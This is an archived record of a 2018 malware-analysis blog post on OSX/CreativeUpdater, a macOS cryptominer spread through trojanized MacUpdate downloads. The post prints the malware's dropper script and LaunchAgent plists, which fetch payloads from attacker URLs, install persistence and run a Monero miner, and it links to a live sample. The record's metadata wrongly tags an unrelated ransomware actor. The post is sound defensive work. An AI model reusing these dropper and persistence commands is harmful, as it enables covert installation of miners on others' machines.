{
    "id": "86ef51fc-3c82-476a-9d9c-00530c20982d",
    "created_at": "2023-01-12T15:03:46.480627Z",
    "updated_at": "2025-03-27T02:16:26.547769Z",
    "deleted_at": null,
    "sha1_hash": "1356210e51ac5afb630d81bb591fcbbfe277770e",
    "title": "2018-02-05 - Analyzing OSX-CreativeUpdater",
    "authors": "",
    "file_creation_date": "2022-05-29T01:22:40Z",
    "file_modification_date": "2022-05-29T01:22:40Z",
    "file_size": 1256315,
    "plain_text": "# Objective-See\n\n**objective-see.com/blog/blog_0x29.html**\n\nAnalyzing OSX/CreativeUpdater\n\nâ€º a macOS cryptominer, distributed via macupdate.com\n\n02/05/2018\n\n[love these blog posts? support my tools & writing on patreon :)](https://www.patreon.com/objective_see)\n\n[Want to play along? I've shared the malware, which can be downloaded here (password:](https://objective-see.com/downloads/malware/CreativeUpdater.zip)\ninfect3d).\n\nBackground\n\nWe're barely into 2018, and already there is another Mac trojan going around. Targeting\nmacOS users, the malware was distributed via infected applications linked to on the popular\n[MacUpdate website. Specifically, on February 1st, the MacUpdate editor 'Jess-MacUpdate'](https://www.macupdate.com/)\nadded comments on several popular applications such as FireFox:\n\nYikes! ðŸ˜±\n\nIn this short blog post we'll dive into the malware, briefly discussing it's persistence\nmechanisms, and capabilities.\n\n\n-----\n\nBefore diving in, I want to thank the following security researchers and friends:\n\n[@noarfromspace](https://twitter.com/noarfromspace)\nwho brought the malware to my attention, provided links and insightful comments about\nthe malware, and AFAIK gets credit for the name OSX/CreativeUpdater!\n\n\n-----\n\n[@thomasreed](https://twitter.com/thomasareed)\nwho also wrote a comprehensive blog post about this malware: \"New Mac cryptominer\ndistributed via a MacUpdate hack\". It's definitely a worthwhile read!\n\n[@marc_etienne_](https://twitter.com/marc_etienne_)\nwho provided valuable insight into both the discovery and analysis of the malware.\n\nOSX/CreativeUpdater\nSo, a user is happily browsing MacUpdate, ends up at their listing for Firefox (or OnyX\nor Deeper)...and decides to download it. As noted by Thomas Reed, the download link\non the MacUpdate site had been modified to point to a hacker controlled URL which\nserved up the malware:\n\n_\"The fake Firefox app was distributed from download-installer.cdn-mozilla.net. (Notice_\n_the domain ends in cdn-mozilla.net, which is definitely not the same as mozilla.net._\n_This is a common scammer trick to make you think itâ€™s coming from a legitimate site.)\"_\n\nThus, instead of the legitimate Firefox application, a trojanized version would be served\nup to the user in form of a signed disk image (Apple Developer ID: Ramos Jaxson):\n\n\n-----\n\nWe can mount this disk image by double-clicking it, or via the 'hdiutil' utility:\n```\n $ hdiutil attach -noverify ~/Downloads/Firefox\\ 58.0.2.dmg \n /dev/disk3s2 Apple_HFS /Volumes/Firefox\n\n```\nThe application shown in the disk image, Firefox.app, is also signed with the same\ndeveloper ID. The fact the both the disk image and application are signed means that\nGatekeeper (in it's default settings) won't block malware from executing.\n\n\n-----\n\nLooking at contents of the trojaned Firefox application bundle, shows the main binary\n('MozillaFirefox'), plus reveals another Firefox application as well as a script (aptly\nnamed 'script') in the Resources directory:\n\nIt's easy to confirm the validity of the this second Firefox application by checking it's\n[digital signature (and ensuring it's signed by Mozilla). The WhatsYourSign Finder](https://objective-see.com/products/whatsyoursign.html)\nextension, will display this signing information via the UI:\n\nAs we'll shortly see, that malware will execute the legitimate Firefox application so that\nuser will no suspect anything malicious has occurred!\n\nDecompiling the main executable, 'MozillaFirefox', we can see it looking for the 'script'\nfile:\n\n\n-----\n\n```\n void [ScriptExecController loadAppSettings](void self, void _cmd) {\n  r13 = [[var_1B0 pathForResource:@\"script\" ofType:0x0] retain];\n  r15 = @selector(defaultManager);\n  r12 = [_objc_msgSend_100015138(@class(NSFileManager), r15) retain];\n  rbx = [[var_1B0 pathForResource:@\"script\" ofType:0x0] retain];\n  r14 = [r12 fileExistsAtPath:rbx];\n  if (r14 == 0x0) {\n      [Alerts fatalAlert:@\"Corrupt app bundle\" \n          subText:@\"Script missing from application bundle.\"];\n  }\n\n```\nIt then executes it, via a call to the '-[ScriptExecController executeScript]' method:\n```\n void -[ScriptExecController executeScript](void * self, void * _cmd) {\n  rbx = self;\n  [rbx prepareForExecution];\n  [rbx prepareInterfaceForExecution];\n  *(int8_t *)(rbx + r14) = 0x1;\n  if (*(int32_t *)&rbx->execStyle == 0x1) {\n      rsi = @selector(executeScriptWithPrivileges);\n  }\n  else {\n      rsi = @selector(executeScriptWithoutPrivileges);\n  }\n  (*_objc_msgSend)(rbx, rsi);\n  return;\n }\n void -[ScriptExecController executeScriptWithoutPrivileges](void * self, void\n* _cmd) {\n  r13->task = [[NSTask alloc] init];\n  [r13->task setLaunchPath:r13->interpreterPath];\n  [r13->task setArguments:r13->arguments];\n  [r13->task launch];\n  ...\n }\n\n```\nAs noted by [@noarfromspace on Twitter, OSX/CreativeUpdater was created using a](https://twitter.com/noarfromspace)\n[legitimate developer tool called Platypus. According to it's website:](https://www.sveinbjorn.org/platypus)\n_\"Platypus is a Mac OS X developer tool that creates native Mac applications from_\n_interpreted scripts such as shell scripts or Perl, Ruby and Python programs. This is_\n_done by wrapping the script in an application bundle along with a native executable_\n_binary that runs the script \"_\n\n\n-----\n\nThis explains why the main application (i.e. the trojanized Firefox.app), simply executes\nthe 'script' file when run.\n\nHrmm, where have we seen Platypus used before!? In OSX/Eleanor:\n\nAnd as I noted on twitter, OSX/Eleanor also used MacUpdate to spread:\n\nIntriguing! Are they related? Who knows...\n\nMoving on, let's peak at the script that's executed when the malicious application is\nstarted:\n\n\n-----\n\n```\n $ cat Firefox.app/Contents/Resources/script \n open Firefox.app\n if [ -f ~/Library/mdworker/mdworker ]; then\n  killall MozillaFirefox\n else\n  nohup curl -o ~/Library/mdworker.zip \n  https://public.adobecc.com/files/1U14RSV3MVAHBMEGVS4LZ42AFNYEFF\n      ?content_disposition=attachment \n  && unzip -o ~/Library/mdworker.zip -d ~/Library \n  && mkdir -p ~/Library/LaunchAgents \n  && mv ~/Library/mdworker/MacOSupdate.plist ~/Library/LaunchAgents \n  && sleep 300 \n  && launchctl load -w ~/Library/LaunchAgents/MacOSupdate.plist \n  && rm -rf ~/Library/mdworker.zip \n  && killall MozillaFirefox &\n\n```\nAs Thomas Reed notes:\n\n\"...this code first attempts to open the decoy application. Next, if the malware is already\ninstalled, the malicious dropper process is killed, since installation is not necessary.\n\nIf the malware is not installed, it will download the malware and unzip it into the userâ€™s\nLibrary folder...It also installs a malicious launch agent file named MacOSupdate.plist,\nwhich recurrently runs another script.\"\n\nIn other words, it simply downloads and installs a persistent payload. What could this\nbe?\n\nThough the zip file the malware tries to download (mdworker.zip, from\nhttps://public.adobecc.com/files/1U14RSV3MVAHBMEGVS4LZ42AFNYEFF) is not\nlonger available, luckily we can grab it from VirusTotal.\n\nFirst, let's look at the 'MacOSupdate.plist' file:\n\n\n-----\n\n```\n <?xml version 1.0 encoding UTF 8 ?>\n <!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" ...>\n <plist version=\"1.0\">\n <dict>\n <key>Label</key>\n <string>MacOSupdate</string>\n <key>ProgramArguments</key>\n <array>\n  <string>sh</string>\n  <string>-c</string>\n  <string>launchctl unload -w ~/Library/LaunchAgents/MacOS.plist \n      && rm -rf ~/Library/LaunchAgents/MacOS.plist && \n      curl -o ~/Library/LaunchAgents/MacOS.plist \n      https://public.adobecc.com/files/1UJET2WD0VPD5SD0CRLX0EH2UIEEFF?\n       content_disposition=attachment \n      && launchctl load -w ~/Library/LaunchAgents/MacOS.plist \n      && ~/Library/mdworker/mdworker</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n </dict>\n </plist>\n\n```\nOk, kinda stupid - just downloads and installs another (new?) version of MacOS.plist.\n\nLooking at these 'secondary' instances of the plist, one can see they persistently\nexecute something named 'mdworker' out of the ~/Library/mdworker/ directory:\n\n\n-----\n\n```\n //version 1\n $ cat ~/Library/LaunchAgents/MacOS.plist\n ...\n <key>ProgramArguments</key>\n <array>\n  <string>sh</string>\n  <string>-c</string>\n  <string>\n    ~/Library/mdworker/mdworker -user sarahmayergo1990@gmail.com -xmr\n   -proxy socks://104.236.13.101:1080\n  </string>\n </array>\n //version 2\n $ cat ~/Library/LaunchAgents/MacOS.plist\n <key>ProgramArguments</key>\n <array>\n  <string>sh</string>\n  <string>-c</string>\n  <string>\n    ~/Library/mdworker/mdworker -user walker18@protonmail.ch -xmr\n  </string>\n </array>\n\n```\n[Running the mdworker binary (in a virtual machine), reveals it's simply MinerGate's](https://minergate.com/)\ncommandline cryptominer, minergate-cli:\n```\n $ ./mdworker -help\n Usage:\n minergate-cli [-version] -user <email> [-proxy <url>] \n        -<currency> <threads> [<gpu intensity>] \n        [-<currency> <threads> [<gpu intensity>] ...] \n        [-o <pool> -u <login> [-t <threads>]\n        [-i <gpu intensity>]]\n\n```\n[This utility is freely available for download from: minergate.com/downloads/console.](https://minergate.com/downloads/console)\n\n\n-----\n\nSince the miner is invoked with the -xmr flag, infected computers will mine Monero.\nAnd what about those email addresses? Thomas notes the mining software will,\n\"periodically connect to minergate.com, passing in the email address as the login\"\n\nSo now we fully understand the goal of the malware: mine crypto-currencies. Really\nnothing too exciting - but a trend we're seeing more and more on macOS!\n\nAnd if you're wondering who did it? Well, there may be some hints buried within the\n[disk image files. If we look closely (as noted by](https://twitter.com/noarfromspace/status/959548339468623873) [@noarfromspace), there's a .DS_Store](https://twitter.com/noarfromspace)\nfile root directory of the dmg!\n```\n $ ls -lart /Volumes/Firefox/ | grep .DS_Store \n -rw-r--r--@ 1 user staff  10244 Jan 31 11:18 .DS_Store\n\n```\n[As explained by Wikipedia, the \".DS_Store is a file that stores custom attributes of its](https://en.wikipedia.org/wiki/.DS_Store)\n\n\n-----\n\n_containing folder, such as the position of icons or the choice of a background image._\nHowever, .DS_Store files also may contain paths....such as the original (full) path of the\n.dmg on the attacker's machine ðŸ™ˆ.\n\nLet's run strings on each the .DS_Store files:\n```\n $ strings -a .DS_Store | grep tiago\n tiagobrandaomateus\n /Users/tiagobrandaomateus/teste/macupdate/Firefox_temp.dmg\n $ strings -a /Volumes/OnyX\\ 3.4.2/.DS_Store | grep -i tiago\n tiagobrandaomateus\n /Users/tiagobrandaomateus/teste/macupdate/OnyX 3.4.2_temp.dmg\n $ strings -a /Volumes/Deeper\\ 2.2.7/.DS_Store | grep -i tiago\n tiagobrandaomateus\n /Users/tiagobrandaomateus/macupdate/deeper-app/Deeper 2.2.7_temp.dmg\n\n```\nInteresting, I wonder who Tiago BrandÃ£o Mateus is!?\n\nConclusions\nIn this blog post we provided a technical analysis of the newly discovered macOS\ncryptominer OSX/CreativeUpdater. Thought not particularly sophisticated nor insidious,\nby utilizing MacUpdate as it's infection vector it had the potential to infect a large\nnumber of users.\n\nLet's end with a few FAQs!\n\nQ: How does one get infected by OSX/CreativeUpdater?\nA: By downloading an infected application from MacUpdates.\n\nSpecifically one of the following applications:\n\n\"Firefox 58.0.2 since 1 February 2018\"\n\n\"Onyx since 1 February 2018\" (likely version 3.4.2)\n\n\"Deeper since 1 February 2018\" (likely version 2.2.7)\n\nQ: Can I still get infected?\nA: Unlikely. MacUpdate notes that they \"have removed the [malicious] link[s]\".\nMoreover, Apple has revoked the certificate used to signed the malicious disk images\nand application:\n\n\n-----\n\nOnce the certificate has been revoked the disk images won't mount nor applications\nrun (via the UI):\n\nQ: How can I tell if I'm infected with OSX/CreativeUpdater?\n\nA: First check to see if there is an process named mdworker or sysmdworker running\nfrom the ~/Library/mdworker/:\n```\n$ ps aux | grep [/]Library/mdworker/\nuser 2199 /Users/user/Library/mdworker/mdworker\n\n```\nOne can also look for the persistent artifacts of the malware. This includes following\nfiles & directories:\n\n~/Library/mdworker/\n\n~/Library/LaunchAgents/MacOSupdate.plist\n\n[KnockKnock tool will also display the launch agent plist](https://objective-see.com/products/knocknock.html)\n(~/Library/mdworker/MacOSupdate.plist):\n\n\n-----\n\nQ: On an infected system, what can OSX/CreativeUpdater do?\n\nA:OSX/CreativeUpdater is designed to simply mine Monero (XMR) cryptocoins. While\nthis will likely use a large percentage of your CPU, that's about all the side-effects. It\nshould be noted that as the malware does (did?) have the ability to update itself, that\nattacker could have provided a customized payload. However at this time, there is no\nindication that this happened.\n\nQ: Your tools will protect from this right?\n\nA: Of course!\n\n[For example, BlockBlock will detect the persistence (when the malware downloads &](https://objective-see.com/products/blockblock.html)\ncreates the launch agent plist via curl:\n\n[LuLu will also display an alert when the malware connects out (again via curl) to](https://objective-see.com/products/LuLu.html)\ndownload various components:\n\n\n-----\n\nWell that wraps up our blog on OSX/CreativeUpdater! Mahalo for reading :)\n\n[love these blog posts & tools? you can support them via patreon! Mahalo :)](https://www.patreon.com/objective_see)\n\nÂ© 2018 objective-see llc\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-02-05 - Analyzing OSX-CreativeUpdater.pdf"
    ],
    "report_names": [
        "2018-02-05 - Analyzing OSX-CreativeUpdater.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535826,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653787360,
    "ts_modification_date": 1653787360,
    "files": {
        "pdf": "https://archive.orkl.eu/1356210e51ac5afb630d81bb591fcbbfe277770e.pdf",
        "text": "https://archive.orkl.eu/1356210e51ac5afb630d81bb591fcbbfe277770e.txt",
        "img": "https://archive.orkl.eu/1356210e51ac5afb630d81bb591fcbbfe277770e.jpg"
    }
}